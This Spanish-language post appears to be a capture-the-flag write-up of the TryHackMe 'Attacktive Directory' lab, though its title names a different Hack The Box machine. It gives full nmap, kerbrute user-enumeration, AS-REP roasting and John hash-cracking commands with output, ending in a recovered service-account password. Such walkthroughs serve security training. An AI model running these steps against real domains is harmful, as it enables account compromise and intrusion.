---
layout: post
title:  "Maquina Retirada Search de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Search
tags: THM, Enumeration, SMB, Kerbrute Userenum, ASPREPRoast Attack, Kerberoasting Attack, Secretsdumps.py, Maquina Gratuitas.
---

# Attacktive ~ Try Hack Me

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.165.157       "
``` 

Segundo escaneo para ver los Servicios
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-14 11:39:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-06-14T11:40:15+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2022-06-13T11:34:00
|_Not valid after:  2022-12-13T11:34:00
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-06-14T11:40:05+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-time: 
|   date: 2022-06-14T11:40:09
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

Procedemos a identificar el nombre de Dominio `spookysec.local` e introducirlo en nuestro `/etc/hosts` 
```
# ping -c 1 spookysec.local
PING spookysec.local (10.10.165.157) 56(84) bytes of data.
64 bytes from spookysec.local (10.10.165.157): icmp_seq=1 ttl=127 time=54.1 ms

--- spookysec.local ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 54.135/54.135/54.135/0.000 ms
```
Una vez hecho esto como vemos que el puerto 88 Kerberos esta abierto vamos a proceder a enumerar Usuarios
```
# kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local
# kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/15/22 - Ronnie Flathers @ropnop

2022/06/15 13:01:07 >  Using KDC(s):
2022/06/15 13:01:07 >   spookysec.local:88

2022/06/15 13:01:07 >  [+] svc-admin has no pre auth required.
2022/06/15 13:01:07 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2022/06/15 13:01:08 >  [+] VALID USERNAME:       james@spookysec.local
2022/06/15 13:01:24 >  [+] VALID USERNAME:       robin@spookysec.local
2022/06/15 13:01:39 >  [+] VALID USERNAME:       darkstar@spookysec.local
2022/06/15 13:02:07 >  [+] VALID USERNAME:       JAMES@spookysec.local
2022/06/15 13:02:30 >  [+] VALID USERNAME:       paradox@spookysec.local
2022/06/15 13:02:31 >  [+] VALID USERNAME:       administrator@spookysec.local
2022/06/15 13:03:06 >  [+] VALID USERNAME:       James@spookysec.local
2022/06/15 13:04:51 >  [+] VALID USERNAME:       backup@spookysec.local
```

Como vemos el usuario `svc-admin` seria vulnerable a un ataque de ASPREPRoast
```
# GetNPUsers.py spookysec.local/ -no-pass -usersfile content/users                                                                                                                                         130 ⨯
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:914d34c23212fbf3ad067101c8f05650$4c8a067f62ae3508879bef3fc92eb8e6b31aa9f616071d47aad50e5ebeab47d5e2bfebdd5aed73a9a79f7eed5ae9a4818ff0c75ac203f1f62ae82053acc1cdde98f24b28afef9eaa67b417e89743b3bc2de9873661a68a95507bf9b27d4d8306b1564b4833c5bcc95eb44e0eb5b49c71c4485e2e616245cae67d8921dc260f61206104cecfd48b30a3033af36836cbded82913910b3ee32623bc10fa12681df67c90f0de13a31b7d18cd5e9900be859894d9725d1044a652c78495f891c8c734762a6284a0f4b05c9460baf31cc56e6aff1911eda33959732d5a8cbb8031ea5649137a63f3d68c9b859f1835652e6e0d6e51
```

Nos Copiamos el Hash y procedemos a crackearlo con la herramienta John
```
# john --wordlist=/usr/share/wordlists/rockyou.txt hash                 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
"management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)"     
1g 0:00:00:02 DONE (2022-06-15 13:09) 0.3367g/s 1965Kp/s 1965Kc/s 1965KC/s manaia010..mamuchopia9
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Nos creamos un archivo de credenciales, con las credenciales obtenidas
```
svc-admin: management2005
```
